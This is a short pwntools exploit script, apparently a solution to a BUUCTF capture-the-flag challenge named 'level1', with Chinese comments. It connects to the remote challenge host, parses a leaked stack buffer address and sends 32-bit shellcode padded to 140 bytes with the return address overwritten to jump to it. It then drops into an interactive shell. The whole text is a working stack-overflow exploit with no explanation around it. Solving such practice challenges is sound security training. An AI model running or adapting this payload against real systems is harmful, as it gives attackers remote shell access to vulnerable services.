from pwn import *
# remote()建立远程连接,指明ip和port
io = remote('node4.buuoj.cn',28957)
context(log_level = "debug",arch = "i386",os = "linux")
#io=process("./level1")
io.recvuntil("What's this:")
buf_addr=io.recvuntil(b"?")
buf_addr= buf_addr[:-1]
shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(140,b'a')+p32(int(buf_addr, 16))
io.sendline(payload) #发送数据
io.interactive() #与shell进行交互

